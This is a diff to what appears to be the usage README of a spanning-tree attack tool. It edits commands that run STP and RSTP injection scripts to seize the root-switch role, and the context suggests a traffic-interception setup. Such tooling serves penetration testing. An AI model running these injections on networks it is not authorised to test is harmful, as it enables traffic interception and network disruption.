@@ -44,11 +44,11 @@ sudo iptables -t nat -A POSTROUTING -o ethX -j MASQUEADE
 ### 3.5 Start of injection.
 #### 3.5.1 STP
 ```
-sudo python3 stpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX **(XX:XX:XX:XX:XX:XX - your MAC...)**
+sudo python3 stpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX 
 ```
 #### 3.5.2 RSTP
 ```
-python3 rstpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX **(XX:XX:XX:XX:XX:XX - your MAC...)**
+sudo python3 rstpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX
 ```
 After executing the injection, you will intercept the role of the root switch. you can track generated STP ads in Wireshark or tcpdump :)
 
